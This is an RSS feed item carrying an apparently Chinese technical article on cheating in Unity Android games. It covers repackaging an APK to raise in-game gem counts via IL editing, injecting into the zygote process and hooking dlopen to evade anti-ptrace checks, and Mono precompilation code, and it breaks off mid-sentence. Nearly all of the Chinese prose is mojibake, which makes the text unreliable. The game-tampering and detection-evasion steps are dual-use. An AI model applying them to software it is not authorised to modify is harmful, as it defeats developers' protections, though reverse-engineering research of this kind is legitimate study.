<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<title>é•¿äº­æŠ€æœ¯ä¸“æ </title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/</link>
<description></description>
<language>zh-cn</language>
<lastBuildDate>Wed, 08 Nov 2017 05:37:06 +0800</lastBuildDate>
<item>
<title>Unityæ¸¸æˆèœé¸¡ç©å®¶çš„åˆ¶èƒœä¹‹è·¯</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-11-07-30703785.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;Unityæ¸¸æˆèœé¸¡ç©å®¶çš„åˆ¶èƒœä¹‹è·¯&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/30703785&quot;&gt;åŸæ–‡&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-6de83ed6f668f836c15e2e6f1b2dbf37_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;ä½œè€…ï¼šèµµå¥‡&lt;/b&gt;&lt;/p&gt;&lt;blockquote&gt;ç¬”è€…ä¸€ç›´è‡ªè®¤ç©è¿‡ä¸å°‘æ¸¸æˆï¼Œæ— å¥ˆæ°´å¹³å¤ªèœï¼Œæ—¥å¸¸é€äººå¤´ã€‚ç—›å®šæ€ç—›ï¼Œå†³å®šå†²(xie)å† (xiu)ä¸€(gai)æ€’(qi)ï¼Œç»è¿‡å‡ æ¬¡å¤±è´¥çš„å°è¯•ä¹‹åï¼Œç»ˆäºæå®šäº†å‡ æ¬¾æ—¶ä¸‹çƒ­é—¨çš„Unityæ¸¸æˆã€‚å‡ºäºå„ç§åŸå› ï¼Œæœ¬æ–‡ä»¥ä¸€æ¬¾ä¸å…·åçš„å›½å¤–æ¸¸æˆä½œä¸ºå®ä¾‹ï¼Œåˆ†äº«ç¬”è€…ç ”ç©¶è¿‡ç¨‹ä¸­çš„ä¸€äº›å¿ƒå¾—ï¼Œä¸å„ä½åˆ†äº«ã€‚&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X00 æ‰“åŒ…å…šçš„é¶¸æ”¹æ³•&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;é¦–å…ˆé‡‡ç”¨æœ€ç®€å•çš„æ‰“åŒ…å…šç­–ç•¥ï¼Œæ¼”ç¤ºä¸€ä¸‹å¦‚ä½•å¿«é€Ÿä¿®æ”¹ä¸€æ¬¾å•æœºæ¸¸æˆçš„é‡‘å¸/å®çŸ³ç­‰èµ„æºã€‚è¿™éƒ¨åˆ†å¿«é€Ÿå¸¦è¿‡ï¼Œä¸»è¦è´Ÿè´£ç†Ÿæ‚‰ Unity æ¸¸æˆç»“æ„ï¼Œæ—¶è‡³ä»Šæ—¥å·²ç»ä¸ç®—ä¸€ç§æŠ€æœ¯äº†ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;é¦–å…ˆå°†æ¸¸æˆå®‰è£… APK è§£åŒ…ï¼Œè¿™é‡Œä½¿ç”¨ apktool æˆ–è€…ç›´æ¥çœ‹ä½œ zip è§£åŒ…æ˜¯æ²¡æœ‰åŒºåˆ«çš„ï¼Œå› ä¸ºæ¸¸æˆä¸¥é‡ä¾èµ–æ¡†æ¶ï¼ŒJava å±‚å’Œ Manifest ç­‰æ–‡ä»¶ä»·å€¼ä¸å¤§ã€‚ä½œä¸º Unity æ¸¸æˆçš„ä¸€ä¸ªç‰¹å¾ç‚¹ï¼Œå¯ä»¥å¾ˆæ˜æ˜¾çš„å‘ç°è¿™æ ·ä¸€ä¸ªæ–‡ä»¶å¤¹ã€‚&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f9320e6f5de0d528d1a8bd36a5bc0e05_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;607&quot; data-rawheight=&quot;377&quot;&gt;&lt;p&gt;Assembly-CSharp.dll ç­‰å‡ ä¸ªæ–‡ä»¶æ˜¯ Unity æ¸¸æˆæœ€é²œæ˜çš„ç‰¹ç‚¹ã€‚é€šè¿‡ file æˆ–è€… binwalk æŸ¥çœ‹å¯ä»¥å‘ç°å®ƒä»¬æ˜¯ C# å­—èŠ‚ç æ ¼å¼ï¼ˆ IL ï¼‰ï¼Œè¿™ç§æ ¼å¼å¦‚æœä¸è¿›è¡ŒåŠ å¯†ï¼Œå¯ä»¥è½»æ¾çš„è¿˜åŸ C#æŒ‡ä»¤ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;æ¥ä¸‹æ¥åœ¨æ‰‹æœºä¸­å®‰è£…ä¸€æ¬¡æ¸¸æˆï¼Œçœ‹ä¸€ä¸‹å¤§è‡´çš„æ¸¸æˆé€»è¾‘ï¼Œç¡®å®šéœ€è¦ä¿®æ”¹ä»€ä¹ˆã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-9dd04206c80d68d8d1f883a87870941e_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;1440&quot; data-rawheight=&quot;999&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;çœ‹èµ·æ¥å³ä¸Šè§’çš„å®çŸ³ä¸é”™ã€‚ã€‚ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;ä¸€èˆ¬æ¥è¯´åœ¨æ¸¸æˆé‡Œè¾¹å®çŸ³éƒ½æ˜¯ç¨€ç¼ºèµ„æºï¼Œè¿™é‡Œä»¥å…¶ä½œä¸ºç›®æ ‡ã€‚ä¸ºäº†å¿«é€Ÿå®šä½ï¼Œå°è¯•ä½¿ç”¨ diamond ï¼Œgem ç­‰å­—ç¬¦ä¸²åœ¨ csæºç ä¸­è¿›è¡Œå…¨å±€æœç´¢ï¼Œå¾ˆå¿«å°±èƒ½å®šä½åˆ°å…³é”®ä½ç½®ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;private void SetupFirebaseDefault()
	{
		this.Defaults.Add(&quot;EnergyStart&quot;, 20);
		this.Defaults.Add(&quot;InitialEnergy&quot;, 75);
		this.Defaults.Add(&quot;EnergyFillerSecs&quot;, 420);
		this.Defaults.Add(&quot;InitialGold&quot;, 200);
		this.Defaults.Add(&quot;InitialGems&quot;, 50);
		this.Defaults.Add(&quot;XpRequirement&quot;, 75);
		this.Defaults.Add(&quot;XpReqIncremental&quot;, 75);
		this.Defaults.Add(&quot;XpAttackBonus&quot;, 5);
		this.Defaults.Add(&quot;BubblesRequired&quot;, 6);
		this.Defaults.Add(&quot;StoreBubbleCostsAddOn&quot;, 2);
		this.Defaults.Add(&quot;ReviveCost&quot;, 100);
		this.Defaults.Add(&quot;ShopTokenCost&quot;, 100);
		this.Defaults.Add(&quot;ShopTokenCostIncremental&quot;, 75);
		this.Defaults.Add(&quot;ShopTokenMax&quot;, 10);
		this.Defaults.Add(&quot;ShopFigMax&quot;, 3);
		this.Defaults.Add(&quot;ShopKeyMax&quot;, 5);
		this.Defaults.Add(&quot;EnergyPricesInGemsBig&quot;, 200);
		this.Defaults.Add(&quot;EnergyPricesInGemsSmall&quot;, 50);
		this.Defaults.Add(&quot;EnergyPackageBig&quot;, 60);
		this.Defaults.Add(&quot;EnergyPackageSmallMin&quot;, 5);
		this.Defaults.Add(&quot;RepeatedFigurineTokenConversion&quot;, 7);
		this.Defaults.Add(&quot;RefreshLootCost&quot;, 20);
  		...
}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;InitialGems&lt;/b&gt; å­—æ®µæ˜æ˜¾æ˜¯åˆå§‹å®çŸ³æ•°çš„æ„æ€ï¼ŒOKå°±å®ƒäº†ã€‚C# å­—èŠ‚ç çš„ä¿®æ”¹æœ‰å¾ˆå¤šç§æ–¹å¼ï¼Œæ¯”è¾ƒæ–¹ä¾¿çš„å·¥å…·æ˜¯ Reflector ï¼Œè¿™é‡Œå› ä¸ºæ²¡æœ‰è¿™ä¸ªå·¥å…·ï¼Œä½¿ç”¨ ILDASM åç¼–è¯‘ï¼Œéšåä¿®æ”¹ï¼Œ ILASM é‡ç¼–è¯‘å›å»çš„æ–¹æ³•ã€‚è¿™ä¸¤ä¸ªå·¥å…·éƒ½æ˜¯å¾®è½¯å®˜æ–¹æä¾›çš„ï¼Œå½“ç„¶å¯ä»¥ç™¾åº¦æœåˆ°ã€‚ ILDASM å…·æœ‰å›¾å½¢åŒ–ç•Œé¢ï¼Œç›´æ¥ä»å…¶ä¸­ dump å‡ºæ¥å³å¯ï¼Œéšåä¿®æ”¹ dump å‡ºçš„ IL æ–‡ä»¶å¦‚ä¸‹ï¼š&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-15e025904749d92edc40d35aa06a10e5_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;1053&quot; data-rawheight=&quot;122&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;æ¥ä¸‹æ¥ä½¿ç”¨ ILASM å‘½ä»¤ ilasm.exe &lt;a href=&quot;http://name.il/&quot;&gt;name.il&lt;/a&gt; /DLL å¯ä»¥å°† IL æ–‡ä»¶å›ç¼–è¯‘æˆ DLL ï¼Œå°†å…¶æ›¿æ¢ APK åŒ…ä¸­çš„å¯¹åº” DLL ï¼Œç­¾åï¼Œå®‰è£…ä¹‹åå¯ä»¥å‘ç°ä¿®æ”¹ç”Ÿæ•ˆäº†ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-5f36c27ef8344b7b5789693438fb3de2_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;1440&quot; data-rawheight=&quot;1019&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;è¿™å°±æ˜¯ Unity æ¸¸æˆæ‰“åŒ…å…šå¿«é€Ÿä¿®æ”¹çš„è¿‡ç¨‹ï¼Œçœ‹èµ·æ¥å¾ˆç®€å•ï¼Œä½†æ˜¯å´å­˜åœ¨ä¸å°‘é—®é¢˜ï¼š&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;è¿™ä¸ªæ¸¸æˆæ²¡æœ‰åšä»»ä½•ä¿æŠ¤ï¼Œä¸€æ—¦å­˜åœ¨ä¿æŠ¤ï¼Œæ¯”å¦‚ILå­—èŠ‚ç åŠ å¯†ï¼Œå°±éœ€è¦å»è·ŸILå­—èŠ‚ç åŠ è½½çš„é€»è¾‘ï¼Œä¼ºæœºæ¢å¤æ˜æ–‡ILå­—èŠ‚ç ã€‚&lt;/li&gt;&lt;li&gt;åŠ å£³é—®é¢˜ï¼Œå¥½åœ¨åŠ å£³æ˜¯é’ˆå¯¹Javaå±‚çš„ï¼Œè€ƒæŸ¥äº†å›½å†…å‡ æ¬¾ä¸»æµæ¸¸æˆä¹‹åå‘ç°åŸºæœ¬æ²¡æœ‰åŠ å£³ï¼Œå› ä¸ºå£³å¹¶ä¸èƒ½ä¿è¯ELFæ–‡ä»¶çš„å®‰å…¨ï¼ŒELFæ–‡ä»¶å¾ˆå¯èƒ½ä½¿ç”¨å…¶ä»–å®‰å…¨ç­–ç•¥ã€‚&lt;/li&gt;&lt;li&gt;é‡æ‰“åŒ…é—®é¢˜ï¼Œå›½å†…æ¸¸æˆæ˜¯ä¸å¯èƒ½è®©ä½ ä¿®æ”¹æ•°æ®é‡æ‰“åŒ…çš„ï¼Œç‰¹åˆ«æ˜¯è”ç½‘æ¸¸æˆï¼Œä¼šæœ‰å¤šå¤„å®Œæ•´æ€§æ ¡éªŒï¼Œå› æ­¤ä¿®æ”¹å·¥ä½œå¿…é¡»åœ¨è¿è¡Œè¿‡ç¨‹ä¸­è¿›è¡Œã€‚&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;ç»¼åˆä»¥ä¸Šï¼Œæˆ‘ä»¬è™½ç„¶å®Œæˆäº†å¯¹ä¸€æ¬¾æ¯«æ— å®‰å…¨ä¿æŠ¤çš„ Unity æ¸¸æˆçš„ä¿®æ”¹ï¼Œä½†æ˜¯ä¸ºäº†è¿›ä¸€æ­¥ç ”ç©¶é€‚ç”¨äºæ›´å¤æ‚æ¡ä»¶ä¸‹çš„ä¿®æ”¹ç­–ç•¥ï¼Œè¿˜éœ€è¦è¿›ä¸€æ­¥ç ”ç©¶å¿ƒå¾—æ–¹æ¡ˆã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X01  æ³¨å…¥ä¸hook&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;è€ƒè™‘åˆ°å›½å†…ä¸»æµæ¸¸æˆçš„å®‰å…¨æœºåˆ¶ï¼Œå¿…é¡»ä½¿ç”¨è¿è¡Œæ—¶ä¿®æ”¹çš„æ–¹å¼ã€‚æ¯”è¾ƒç†æƒ³çš„æ–¹å¼æ˜¯å…ˆæ³¨å…¥ zygote è¿›ç¨‹ã€‚zygote è¿›ç¨‹æ˜¯ Dalvik è™šæ‹Ÿæœºçš„å­µåŒ–å™¨è¿›ç¨‹ã€‚ä¼—æ‰€å‘¨çŸ¥ï¼Œå¸¸è§„çš„ Android APP æ˜¯è¿è¡Œåœ¨ Dalvik è™šæ‹Ÿæœºï¼ˆæˆ–è€…å…¶ç»§æ‰¿è€… ART ï¼‰ä¸­çš„ï¼Œè™šæ‹Ÿæœºéœ€è¦åŠ è½½å¾ˆå¤šè¿è¡Œæ‰€éœ€çš„åº“ï¼ˆ&lt;a href=&quot;http://xn--libdvm-hh4k.so/&quot;&gt;å¦‚&lt;/a&gt; &lt;a href=&quot;http://xn--libdvm-hh4k.so/&quot;&gt;libdvm.so&lt;/a&gt; ï¼‰ï¼Œå¹¶ä¸”åˆå§‹åŒ–è™šæ‹Ÿæœºå¯¹è±¡ã€‚è¿™ä¸ªè¿‡ç¨‹è´¹æ—¶è´¹åŠ›ï¼Œä¸ºäº†ä¿è¯åº”ç”¨çš„å¯åŠ¨é€Ÿåº¦ï¼Œzygoteè¢«è®¾è®¡ä¸ºè™šæ‹Ÿæœºè¿›ç¨‹çš„çˆ¶è¿›ç¨‹ã€‚å½“åº”ç”¨å¯åŠ¨æ—¶ï¼Œç›´æ¥ä» zygote ä¸Š fork() å‡ºæ¥ï¼Œç»§æ‰¿å…¶è™šæ‹Ÿå†…å­˜ç©ºé—´ã€‚å› æ­¤ï¼Œæ³¨å…¥åˆ° zygote è¿›ç¨‹çš„å¥½å¤„æ˜¯å…ˆäºåº”ç”¨ä»£ç æ‰§è¡Œï¼Œå¯ä»¥æœ‰æ•ˆé¿å…æ³¨å…¥è¿‡ç¨‹è¢«åº”ç”¨çš„ anti-ptrace æœºåˆ¶æ£€æµ‹åˆ°ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Android å¹³å°ä¸Šçš„æ³¨å…¥å·²ç»æ˜¯ç›¸å¯¹æˆç†Ÿçš„ä¸€å¥—ä»£ç ï¼Œæœ€åˆæ˜¯ç”±çœ‹é›ªç‰ˆä¸»å¤æ²³å¤§å¤§å‘å¸ƒï¼Œéšåå‡ºç°äº†å¾ˆå¤šçš„æ›´æ–°ã€ä¼˜åŒ–ç‰ˆæœ¬ã€‚å…¶åŸºæœ¬æ€è·¯æ˜¯åˆ©ç”¨ Linux å¹³å°ä¸Šçš„è·¨è¿›ç¨‹æ§åˆ¶æœºåˆ¶ ptrace ï¼Œé€šè¿‡å¯¹ ptrace çš„å°è£…å®ç°ç›®æ ‡è¿›ç¨‹çš„è¯»ã€å†™ï¼Œå¯„å­˜å™¨è·å–ã€ä¿å­˜ã€æ¢å¤ï¼Œé¡µçŠ¶æ€å˜æ›´ã€å†™å…¥ä¸€æ®µæ–½å·¥ç¨‹åºã€è¿œç¨‹è°ƒç”¨æ–½å·¥ç¨‹åºï¼Œè´Ÿè´£å°†å¾…æ³¨å…¥æ¨¡å—åŠ è½½åˆ°ç›®æ ‡å†…å­˜ä¸­ã€‚è¿™äº›å†…å®¹å‰äººä¹‹è¿°å¤‡çŸ£ï¼Œè¿™é‡Œè´´å‡ ä¸ªç›¸å…³é“¾æ¥ï¼Œä¸åœ¨åšå…·ä½“å±•å¼€ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://bbs.pediy.com/thread-141355.htm&quot;&gt;[åŸåˆ›]å‘ä¸ªAndroidå¹³å°ä¸Šçš„æ³¨å…¥ä»£ç -ã€Androidå®‰å…¨ã€-çœ‹é›ªå®‰å…¨è®ºå›&lt;/a&gt; libinject&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/jiayy/p/4286828.html&quot;&gt;android hook æ¡†æ¶ libinject2 ç®€ä»‹ã€ç¼–è¯‘ã€è¿è¡Œ&lt;/a&gt; libinject2&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://blog.csdn.net/qq1084283172/article/details/53869796&quot;&gt;Androidè¿›ç¨‹çš„soæ³¨å…¥--Poisonï¼ˆç¨³å®šæ³¨å…¥ç‰ˆï¼‰ - æ°´æ±ã€‚2014 çš„ä¸“æ  - CSDNåšå®¢&lt;/a&gt; Poisonæ³¨å…¥æ¡†æ¶&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;åœ¨å®Œæˆæ³¨å…¥ä¹‹åï¼Œæˆ‘ä»¬çš„åŠŸèƒ½ä»£ç å³å¯åœ¨ç›®æ ‡è¿›ç¨‹ä¸­æ‰§è¡Œï¼Œæ¥ä¸‹æ¥éœ€è¦åœ¨ç›®æ ‡è¿›ç¨‹ä¸­æ‰§è¡Œ hook è¿‡ç¨‹ã€‚é€šè¿‡ hook æŠ€æœ¯ï¼Œå¯ä»¥æˆªæ–­ä¸€ä¸ªå‡½æ•°çš„æ‰§è¡Œæµç¨‹å¹¶æ’å…¥è‡ªå®šä¹‰çš„ä»£ç ã€‚é’ˆå¯¹ zygote æ³¨å…¥ï¼Œè¿™ä¸ªé—®é¢˜ç¨å¾®å¤æ‚ã€‚å› ä¸ºåœ¨æˆ‘ä»¬æ³¨å…¥ zygote çš„æ—¶æœºï¼Œæ¸¸æˆè¿›ç¨‹è¿˜æ²¡æœ‰å¯åŠ¨ï¼Œå› æ­¤æ— æ³•ç›´æ¥ hook åˆ°ç›®æ ‡å‡½æ•°ã€‚åé¢å°†ä¼šä»‹ç»åˆ°ï¼Œæˆ‘ä»¬çš„ç›®æ ‡å‡½æ•°æ˜¯ native å±‚çš„ c å‡½æ•°ã€‚å› ä¸º zygote è¿›ç¨‹æœ€åä¼š fork æˆæ¸¸æˆè¿›ç¨‹ï¼Œä¸ºäº†æ„ŸçŸ¥æ¸¸æˆè¿›ç¨‹ä¸­ç›®æ ‡å‡½æ•°çš„åŠ è½½ï¼Œå¯ä»¥ç›‘æ§è¯¥å‡½æ•°æ‰€åœ¨çš„åº“çš„åŠ è½½ï¼Œé‚£ä¹ˆå°±éœ€è¦ç”¨åˆ° linker ä¸­çš„ dlopen å‡½æ•°ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;void *dlopen(const char *filename, int flags);&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;é€šè¿‡ hook dlopen å‡½æ•°å¹¶æ£€æŸ¥ filename å‚æ•°ç¡®å®šç›®æ ‡åº“çš„åŠ è½½ï¼Œéšåå†ä¸€æ¬¡è¿›è¡Œå®é™…çš„åŠŸèƒ½æ€§ hook ï¼Œhook ç›®æ ‡å‡½æ•°è¾¾åˆ°ä¿®æ”¹ç›®çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œé€šè¿‡ zygote hook çš„æ–¹å¼ hook ä¸€ä¸ªç›®æ ‡å‡½æ•°ï¼Œéœ€è¦è¿›è¡Œä¸¤æ¬¡ hook ï¼Œç¬¬ä¸€æ¬¡æ˜¯ hook linker ä¸­çš„ dlopen ä»¥ç¡®å®šç›®æ ‡æ¨¡å—çš„åŸºå€ï¼Œç¬¬äºŒæ¬¡æ˜¯åœ¨è¯¥æ¨¡å—ä¸­ hook ç›®æ ‡å‡½æ•°ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªå°é—®é¢˜æ˜¯ç”±äº dlopen å‡½æ•°åœ¨æ¯ä¸€ä¸ª zygote çš„å­è¿›ç¨‹ä¸­éƒ½ä¼šè¢« hook ï¼Œå¯¼è‡´ç³»ç»Ÿæ€§èƒ½ä¸‹é™ï¼Œä¸€ä¸ªè§£å†³æ–¹æ¡ˆæ˜¯å®šæœŸæŸ¥çœ‹&lt;b&gt; /proc/pid/cmdline&lt;/b&gt; å¦‚æœè‡ªèº«ä¸æ˜¯ç›®æ ‡è¿›ç¨‹é‚£ä¹ˆå°±è§£é™¤ hook ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;é’ˆå¯¹ Unity æ¸¸æˆçš„ hook æ€è·¯å¤§ä½“å¦‚ä¸Šï¼Œæœ¬èŠ‚çš„æœ€åå†è®²è®²å…³äºä½¿ç”¨çš„ hook æ¡†æ¶ã€‚Hook æ“ä½œçš„åŸç†å¯ä»¥ç†è§£ä¸ºå¼ºè¡Œä¿®æ”¹ç¨‹åºçš„ä»£ç æ®µï¼Œé€šè¿‡ä¿®æ”¹ç›®æ ‡åœ°å€ä¸Šçš„å­—èŠ‚ç ä¸º B ï¼ŒJMP ç­‰æŒ‡ä»¤å°†æŒ‡ä»¤æµè·³è½¬åˆ° hook è€…æ§åˆ¶çš„ä½ç½®æ‰§è¡Œå¦ä¸€æ®µæŒ‡ä»¤ã€‚å½“ç„¶å®é™…å®ç°ä¸­å¤æ‚æ€§è¿œè¿œå¤§äºè¿™å¥æè¿°ï¼Œå› ä¸ºæŒ‡ä»¤æ‰§è¡Œå®Œæ¯•ä¹‹åé€šå¸¸éœ€è¦è¿”å›åˆ° hook å‰çš„ä½ç½®ï¼Œå¦‚ä½•ä¿è¯ hook ç‚¹å¤„æŒ‡ä»¤ã€å¯„å­˜å™¨å€¼ç­‰å„ç§ä¿¡æ¯å®Œå¥½ï¼Œæ˜¯éœ€è¦å¾ˆå¤§å·¥ä½œé‡çš„ã€‚Java å±‚çš„ hook æ¡†æ¶å¯ä»¥ä½¿ç”¨ XScript ã€frida ã€cydia substrate ç­‰ç­‰ï¼Œnative å±‚ç¬”è€…å°è¯•è¿‡çš„æœ‰æ•ˆå·¥å…·æœ‰ cydia substrateå’Œandroid-inline-hook ( &lt;a href=&quot;https://github.com/ele7enxxh/Android-Inline-Hook&quot;&gt;ele7enxxh/Android-Inline-Hook&lt;/a&gt; )ã€‚ARM å¹³å°ä¸Šçš„ hook å·¥å…·å¼€å‘æœ‰å‡ ä¸ªå‘ç‚¹ï¼Œä¸€ä¸ªåŸå› æ˜¯ç”±äº ARM æœ‰å¤§é‡ä½ç½®ç›¸å…³ä»£ç ï¼Œå¦‚æœ hook ç‚¹åœ¨è¿™ç§æŒ‡ä»¤ä¸Šï¼Œé‚£ä¹ˆæƒ³è¦åœ¨å¼‚åœ°æ¢å¤è¿™æ¡æŒ‡ä»¤ç›¸å½“å›°éš¾ï¼›å¦ä¸€ä¸ªåŸå› æ˜¯ ARM ä¸Šå­˜åœ¨ Thumb æŒ‡ä»¤é›†ï¼Œéœ€è¦è€ƒè™‘åˆ¤æ–­å½“å‰æŒ‡ä»¤é›†å¹¶æ‰§è¡Œä¸åŒçš„æ“ä½œã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;æœ‰äº†æ³¨å…¥å’Œ hook ä¸¤ç§å·¥å…·ï¼Œå°±å¯ä»¥å®Œæˆå¯¹ç›®æ ‡å‡½æ•°çš„è¿è¡Œæ—¶ä¿®æ”¹ã€‚ä¸‹ä¸€èŠ‚æ¢è®¨é’ˆå¯¹ Unity æ¸¸æˆï¼Œå…·ä½“ä¿®æ”¹å“ªäº›å‡½æ•°å¯ä»¥å®Œæˆå¯¹æ¸¸æˆé€»è¾‘çš„æ§åˆ¶ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X02  MonoåŠ è½½C#å­—èŠ‚ç è¿‡ç¨‹åˆ†æ&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&amp;gt;  å¯èƒ½å¾ˆå¤šäººéƒ½åƒæˆ‘ä¸€æ ·å¥½å¥‡è¿‡ï¼ŒAndroid æ˜¯ä¸€ä¸ªç±» Java è™šæ‹Ÿæœºéƒ¨ç½²åœ¨ Linux å¹³å°ä¸Šï¼Œæ€ä¹ˆå°±è·‘èµ·æ¥äº†å¾®è½¯çš„ C# ï¼Ÿå…¶å® C# å·²ç»è¢« ECMA ç»„ç»‡æ ‡å‡†åŒ–ï¼ˆè™½ç„¶è¿™ç»„ç»‡å’Œå¾®è½¯æ¸Šæºé¢‡æ·±ï¼‰ï¼Œå¹¶ä¸”æ ‡å‡†åŸºç¡€ä¸Šå‡ºç°äº†ä¸€å¥—è¿è¡Œæ—¶ï¼ˆ Common Language Runtime , CLR ï¼‰ã€‚è¿™å¥—è¿è¡Œæ—¶çš„å…·ä½“å®ç°æ˜¯ä¸€ä¸ªå«åš mono çš„å¼€æºé¡¹ç›®ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;æœ¬èŠ‚ä»‹ç» mono æ‰§è¡Œ C# å­—èŠ‚ç çš„è¿‡ç¨‹ã€‚Android ä¸Šçš„ Unity æ­£æ˜¯é€šè¿‡ mono çš„ Just-in-time Compile æœºåˆ¶å®Œæˆäº†ä» C# è¯­è¨€ä¸–ç•Œåˆ° ARM æœºå™¨ç ä¸–ç•Œçš„è½¬åŒ–ã€‚æ¥ä¸‹æ¥å¯¹ Mono é¡¹ç›®çš„æºç ä¸­å¯¹ DLL å¤„ç†çš„é€»è¾‘åšä¸€ä¸ªåˆ†æã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;é¦–å…ˆï¼Œmono åŠ è½½ DLL æ–‡ä»¶ä¹‹åï¼Œä¼šè¿›è¡Œé¢„ç¼–è¯‘ï¼Œé¦–å…ˆè°ƒç”¨ &lt;b&gt;/mono/mini/mini.c&lt;/b&gt; ä¸­çš„ mono_precompile_assemblies å‡½æ•°ï¼Œè¯¥å‡½æ•°å¯¹æ‰€æœ‰éœ€è¦åŠ è½½çš„ assembly æ–‡ä»¶é€ä¸ªè°ƒç”¨ mono_precompile_assembly ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;void mono_precompile_assemblies ()
{
	GHashTable *assemblies = g_hash_table_new (NULL, NULL);

	mono_assembly_foreach ((GFunc)mono_precompile_assembly, assemblies);

	g_hash_table_destroy (assemblies);
}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;static void
mono_precompile_assembly (MonoAssembly *ass, void *user_data)
{
	...
	for (i = 0; i &amp;lt; mono_image_get_table_rows (image, MONO_TABLE_METHOD); ++i) {
		method = mono_get_method (image, MONO_TOKEN_METHOD_DEF | (i + 1), NULL);
		mono_compile_method (method);
		if (strcmp (method-&amp;gt;name, &quot;Finalize&quot;) == 0) {
			invoke = mono_marshal_get_runtime_invoke (method, FALSE);
			mono_compile_method (invoke);
		}
	...
}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;è¿™é‡Œæ‘˜å–äº† mono_precompile_assembly å‡½æ•°çš„å…³é”®æ­¥éª¤ã€‚è¯¥å‡½æ•°ä¸­é’ˆå¯¹å½“å‰éœ€è¦å¤„ç†çš„çš„ assembly ï¼Œå¯¹å…¶ä¸­æ¯ä¸€ä¸ªå‡½æ•°è°ƒç”¨ mono_compile_method è¿›è¡Œç¼–è¯‘ï¼ŒåŒæ—¶ç¼–è¯‘ invoke ã€‚è¿™ä¸ª invoke æ˜¯å¯¹åº”å‡½æ•°çš„ä¸€ä¸ªåŒ…è£…å™¨ï¼Œå½“  monoæœ€ç»ˆè°ƒç”¨å‡½æ•°æ—¶ï¼Œä¼šé€šè¿‡åŒ…è£…å™¨è°ƒç”¨è€Œä¸æ˜¯ç›´æ¥è°ƒç”¨ã€‚å› æ­¤åœ¨å‡½æ•° compile å®Œæˆä¹‹åï¼Œä¼šç”Ÿæˆå¹¶ç¼–è¯‘ invoke 